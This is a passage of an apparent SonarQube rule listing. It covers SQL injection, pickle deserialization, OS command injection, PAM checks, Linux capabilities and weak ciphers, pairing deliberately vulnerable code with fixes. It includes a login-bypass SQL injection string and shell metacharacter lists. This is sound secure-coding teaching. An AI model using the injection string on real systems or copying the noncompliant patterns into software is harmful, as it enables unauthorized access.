                pass: pass,
            },
            type: QueryTypes.SELECT,
            model: User,
        }
    );

    res.send(JSON.stringify(loggedInUser));
    res.end();
}
</pre>
<h3>How does this work?</h3>
<h4>Use prepared statements</h4>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an
interpreted context.</p>
<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br> Here is an example with the
following query string (Java SE syntax):</p>
<pre>
SELECT * FROM users WHERE user = ? AND pass = ?
</pre>
<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol '?' was used as
a placeholder.</strong></p>
<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals
corresponding to the placeholders to the database.<br> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and
some do not - because they do it transparently.</p>
<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>
<p>After compilation, the query logic is frozen and cannot be changed.<br> So when the application passes the literals that replace the placeholders,
they are not considered application logic by the database.</p>
<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes
them.</p>
<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a
query. An attacker who controls this third-party data can cause the database to execute malicious code.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/">SonarSource, Exploiting Hibernate Injections</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP, SQL Injection Prevention Cheat
  Sheet</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/89">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITdGBQ">CERT, IDS00-J.</a> - Prevent SQL injection </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5135">
              pythonsecurity:S5135
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Deserialization injections occur when applications deserialize wholly or partially untrusted data without verification.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application performing unsafe deserialization:<br> After detecting the injection vector, attackers inject a
carefully-crafted payload into the application.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attackers succeed in injecting an object of the expected class, but with malicious properties that affect the object’s
behavior.</p>
<p>If the application relies on the properties of the deserialized object, attackers can modify the data structure or content to escalate privileges
or perform unwanted actions.<br> In the context of an e-commerce application, this could be changing the number of products or prices.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in injecting an object of a completely different class than expected, triggering code
execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul>
  <li> Download the internal server’s data, most likely to sell it. </li>
  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>
  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to
elevate his privileges as an administrator and attack other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
through a combination of unsafe deserialization and misconfiguration:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to deserialization attacks because it deserializes HTTP data without validating it first.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import Flask, request
from base64 import b64decode
import pickle

app = Flask(__name__)

@app.route("/example")
def example():
    objstr = b64decode(request.args.get("object"))
    obj = pickle.loads(objstr)
    return str(obj.status == "OK")
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import Flask, request
import json

app = Flask(__name__)

@app.route("/example")
def example():
    obj = json.loads(request.args.get("object"))
    return str(obj["status"] == "OK")
</pre>
<h3>How does this work?</h3>
<p>Allowing users to provide data for deserialization generally creates more problems than it solves.</p>
<p>Anything that can be done through deserialization can generally be done with more secure data structures.<br> Therefore, our first suggestion is to
avoid deserialization in the first place.</p>
<p>However, if deserialization mechanisms are valid in your context, here are some security suggestions.</p>
<h4>More secure serialization methods</h4>
<p>Some more secure serialization methods reduce the risk of security breaches, although not definitively.</p>
<p>A complete object serializer is probably unnecessary if you only need to receive primitive data (for example integers, strings, bools, etc.).<br>
In this case, formats such as JSON and XML protect the application from deserialization attacks by default.</p>
<p>For more complex objects, the next step is to control which class fields are exposed by creating class-specific serialization methods.<br> The most
common method is to use Data Transfer Objects (DTO) patterns or Google Protocol Buffers (protobufs). After creating the Protobuf data structure, the
Protobuf compiler creates class files that handle operations such as serializing and deserializing data.</p>
<h4>Integrity check</h4>
<p>Message authentication codes (MAC) can be used to prevent tampering with serialized data that is meant to be stored outside the application
server:</p>
<ul>
  <li> On the server-side, when serializing an object, compute a MAC of the result and append it to the serialized object string. </li>
  <li> When the serialized value is submitted back, verify the serialization string MAC on the server side before deserialization. </li>
</ul>
<p>Depending on the situation, two MAC computation modes can be used.</p>
<p>If the same application will be responsible for the MAC computing and validation, a symmetric signature algorithm can be used. In that case, HMAC
should be preferred, with a strong underlying hash algorithm such as SHA-256.</p>
<p>If multiple parties have to validate the serialized data, an asymetric signature algorithm should be used. This will reduce the chances for a
signing secret to be leaked. In that case, the <code>RSASSA-PSS</code> algorithm can be used.</p>
<p><strong>Note</strong>: Be sure to store the signing secret securely.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">Top 10 2017 Category A8 - Insecure
  Deserialization</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/502">CWE-502 - Deserialization of Untrusted Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S2076">
              pythonsecurity:S2076
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br> In that case,
an attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the
underlying operating system.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can
execute an arbitrary program that is installed on the system.</p>
<p>Especially, in this example, if the <strong>host</strong> request parameter contains system shell control characters, the expected
<code>ping</code> command behavior will be changed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/example')
def example():
    host = request.args.get("host", "www.google.com")

    status = os.system("ping -c 1 %s" % host) # Noncompliant
    return str(status == 0)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/example')
def example():
    host = request.args.get("host", "www.google.com")

    status = subprocess.run(["ping", "-c", "1", "--", host]).returncode
    return str(status == 0)
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our first suggestion is to
avoid using OS commands in the first place.<br> However, if the application requires running OS commands with user-controlled data, here are some
security suggestions.</p>
<h4>Pre-Approved commands</h4>
<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the
cleanest way to avoid this problem is to validate the input before using it in an OS command.</p>
<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br>
If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use
regexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using
<code>^/bin/(ls|pwd|grep)$</code>.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h4>Neutralize special characters</h4>
<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special
sanitization components, such as <code>subprocess</code>.</p>
<p>The library helps you to get rid of common dangerous characters, such as:</p>
<ul>
  <li> <code>&amp;</code> </li>
  <li> <code>|</code> </li>
  <li> <code>;</code> </li>
  <li> <code>$</code> </li>
  <li> <code>&gt;</code> </li>
  <li> <code>&lt;</code> </li>
  <li> <code>`</code> </li>
  <li> <code>\</code> </li>
  <li> <code>!</code> </li>
</ul>
<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are
neutralized.<br> Argument delimiters count <code>'</code>, <code>-</code> and spaces.</p>
<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br> In this case, option processing can be
terminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a
href="https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits">since its version 2.24</a>.</p>
<p>In the example compliant code, using the <code>subprocess.run</code> function helps to escape the passed arguments. It accepts a list of command
arguments that will be properly escaped and concatenated to form the command line to execute.</p>
<h4>Disable shell integration</h4>
<p>In most cases, command execution libraries propose two ways to execute external program: with or without shell integration.</p>
<p>When shell integration is allowed, an attacker with control over the command arguments can simply execute additional external programs using system
shell features. For example, on Unix, command pipelining (<code>|</code>) or string interpolation (<code>$()</code>, <code>&lt;()</code>, etc.) can be
used to break out of a command call.</p>
<p>Therefore, it is generally preferable to disable shell integration.</p>
<p>In the example compliant code, using the <code>subprocess</code> module’s functions is preferred over older alternative as the <code>os</code> or
<code>popen</code> modules. Indeed, <code>subprocess</code>, while still a dangerous library, disables the system shell’s syntax interpretation by
default.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">OWASP, OS Command Injection Defense
  Cheaty Sheet</a> </li>
  <li> <a href="https://gtfobins.github.io/#+shell">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>
  <li> <a href="https://lolbas-project.github.io/#">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>
  <li> <a href="https://peps.python.org/pep-0324/">PEP 324 – subprocess - New process module</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/78">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S3649">
              tssecurity:S3649
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and
inserts it into a database query without sanitizing it first.</p>
<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is
used.</p>
<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>
<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to SQL injection:<br> After discovering the injection, attackers inject data into the
vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data manipulation</h4>
<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread
impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Chaining DB injections with other vulnerabilities</h4>
<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul>
  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>
  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).
    <ul>
      <li> See <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/">our article on this topic</a> </li>
    </ul>  </li>
</ul>
<h2>How to fix it in Sequelize</h2>
<h3>Code examples</h3>
<p>The following code is an example of an overly simple authentication function. It is vulnerable to SQL injection because user-controlled data is
inserted directly into a query string: The application assumes that incoming data always has a specific range of characters, and ignores that some
characters may change the query logic to a malicious one.</p>
<p>In this particular case, the query can be exploited with the following string:</p>
<pre>
foo' OR 1=1 --
</pre>
<p>By adapting and inserting this template string into one of the fields (<code>user</code> or <code>pass</code>), an attacker would be able to log in
as any user within the scoped user table.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
async function index(req, res) {
    const { db, User } = req.app.get('sequelize');

    const user = req.query.user;
    const pass = req.query.pass;

    let loggedInUser = await db.query(
        `SELECT * FROM users WHERE user = '${user}' AND pass = '${pass}'`,
        {
            model: User,
        }
    ); // Noncompliant

    res.send(JSON.stringify(loggedInUser));
    res.end();
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
async function index(req, res) {
    const { db, User, QueryTypes } = req.app.get('sequelize');

    const user = req.query.user;
    const pass = req.query.pass;

    let loggedInUser = await db.query(
        `SELECT * FROM users WHERE user = $user AND pass = $pass`,
        {
            bind: {
                user: user,
                pass: pass,
            },
            type: QueryTypes.SELECT,
            model: User,
        }
    );

    res.send(JSON.stringify(loggedInUser));
    res.end();
}
</pre>
<h3>How does this work?</h3>
<h4>Use prepared statements</h4>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an
interpreted context.</p>
<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br> Here is an example with the
following query string (Java SE syntax):</p>
<pre>
SELECT * FROM users WHERE user = ? AND pass = ?
</pre>
<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol '?' was used as
a placeholder.</strong></p>
<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals
corresponding to the placeholders to the database.<br> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and
some do not - because they do it transparently.</p>
<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>
<p>After compilation, the query logic is frozen and cannot be changed.<br> So when the application passes the literals that replace the placeholders,
they are not considered application logic by the database.</p>
<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes
them.</p>
<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a
query. An attacker who controls this third-party data can cause the database to execute malicious code.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/">SonarSource, Exploiting Hibernate Injections</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP, SQL Injection Prevention Cheat
  Sheet</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/89">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITdGBQ">CERT, IDS00-J.</a> - Prevent SQL injection </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5982">
              cpp:S5982
            </a>
          </td>
          <td>
            <details>
              <p>The purpose of changing the current working directory is to modify the base path when the process performs relative path resolutions. When the
working directory cannot be changed, the process keeps the directory previously defined as the active working directory. Thus, verifying the success
of chdir() type of functions is important to prevent unintended relative paths and unauthorized access.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The success of changing the working directory is relevant for the application. </li>
  <li> Changing the working directory is required by chroot to make the new root effective. </li>
  <li> Subsequent disk operations are using relative paths. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>After changing the current working directory verify the success of the operation and handle errors.</p>
<h2>Sensitive Code Example</h2>
<p>The <code>chdir</code> operation could fail and the process still has access to unauthorized resources. The return code should be verified:</p>
<pre>
const char* any_dir = "/any/";
chdir(any_dir); // Sensitive: missing check of the return value

int fd = open(any_dir, O_RDONLY | O_DIRECTORY);
fchdir(fd); // Sensitive: missing check of the return value
</pre>
<h2>Compliant Solution</h2>
<p>Verify the return code of <code>chdir</code> and handle errors:</p>
<pre>
const char* root_dir = "/jail/";
if (chdir(root_dir) == -1) {
  exit(-1);
} // Compliant

int fd = open(any_dir, O_RDONLY | O_DIRECTORY);
if(fchdir(fd) == -1) {
  exit(-1);
} // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/252">CWE-252 - Unchecked Return Value</a> </li>
  <li> <a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man7.org</a> - chdir </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5832">
              cpp:S5832
            </a>
          </td>
          <td>
            <details>
              <p>Pluggable authentication module (PAM) is a mechanism used on many UNIX variants to provide a unified way to authenticate users, independently of
the underlying authentication scheme.</p>
<h2>Why is this an issue?</h2>
<p>When authenticating users, if the validity of the account is not checked (not locked, not expired …​), it may lead to unauthorized access to
resources.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
int valid(pam_handle_t *pamh) {
    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) != PAM_SUCCESS) { // Noncompliant
        return -1;
    }

    return 0;
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
int valid(pam_handle_t *pamh) {
    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) != PAM_SUCCESS) {
        return -1;
    }
    if (pam_acct_mgmt(pamh, 0) != PAM_SUCCESS) {
        return -1;
    }

    return 0;
}
</pre>
<h3>How does this work?</h3>
<p>The account validity is checked with <code>pam_acct_mgmt</code> when authenticating a user with <code>pam_authenticate</code>.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> The Open Group - <a href="https://pubs.opengroup.org/onlinepubs/8329799/pam_acct_mgmt.htm"><code>pam_acct_mgmt</code></a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Packt hub - <a href="https://hub.packtpub.com/development-pluggable-authentication-modules-pam/">Development with Pluggable Authentication
  Modules (PAM)</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/304">CWE-304 - Missing Critical Step in Authentication</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5849">
              cpp:S5849
            </a>
          </td>
          <td>
            <details>
              <p>Setting capabilities can lead to privilege escalation.</p>
<p>Linux capabilities allow you to assign narrow slices of <code>root</code>'s permissions to files or processes. A thread with capabilities bypasses
the normal kernel security checks to execute high-privilege actions such as mounting a device to a directory, without requiring (additional) root
privileges.</p>
<h2>Ask Yourself Whether</h2>
<p>Capabilities are granted:</p>
<ul>
  <li> To a process that does not require all capabilities to do its job. </li>
  <li> To a not trusted process. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Capabilities are high privileges, traditionally associated with superuser (root), thus make sure that the most restrictive and necessary
capabilities are assigned to files and processes.</p>
<h2>Sensitive Code Example</h2>
<p>When setting capabilities:</p>
<pre>
cap_t caps = cap_init();
cap_value_t cap_list[2];
cap_list[0] = CAP_FOWNER;
cap_list[1] = CAP_CHOWN;
cap_set_flag(caps, CAP_PERMITTED, 2, cap_list, CAP_SET);

cap_set_file("file", caps); // Sensitive
cap_set_fd(fd, caps); // Sensitive
cap_set_proc(caps); // Sensitive
capsetp(pid, caps); // Sensitive
capset(hdrp, datap); // Sensitive: is discouraged to be used because it is a system call
</pre>
<p>When setting SUID/SGID attributes:</p>
<pre>
chmod("file", S_ISUID|S_ISGID); // Sensitive
fchmod(fd, S_ISUID|S_ISGID); // Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/250">CWE-250 - Execution with Unnecessary Privileges</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
  <li> <a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=2522">False Boundaries and Arbitrary Code Execution</a> </li>
  <li> <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">Linux manual page</a> - capabilities(7) </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5547">
              cpp:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create("DES/CBC/PKCS7", Botan::ENCRYPTION); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create("AES-256/GCM", Botan::ENCRYPTION);
}
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://botan.randombit.net/handbook/">Botan</a> - Handbook </li>
  <li> <a href="https://www.feistyduck.com/books/openssl-cookbook/">OpenSSL</a> - Cookbook </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5542">
              cpp:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and
reducing the difficulty of recovering the original cleartext.</p>
<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used
with caution.</p>
<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
